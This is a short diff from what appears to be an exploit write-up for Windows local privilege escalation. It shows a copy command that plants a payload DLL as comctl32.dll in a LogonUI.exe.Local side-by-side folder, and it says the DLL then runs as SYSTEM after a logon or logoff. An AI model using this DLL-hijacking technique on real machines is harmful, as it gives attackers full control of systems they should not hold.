@@ -14,7 +14,7 @@ Step 3. Create/copy payload dll file in that folder as comctl32.dll.
 
 copy malicious.dll C:\Windows\System32\LogonUI.exe.Local\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.720_none_e6beb5c51314836b\comctl32.dll 
 
-Step 4. Then restart or logon-logoff. Your payload dll will execute as SYSTEM.
+Step 4. Then restart or logon-logoff (winKey+ l). Your payload dll will execute as SYSTEM.
 
 
 Thanks @PsiDragon for this advice. 
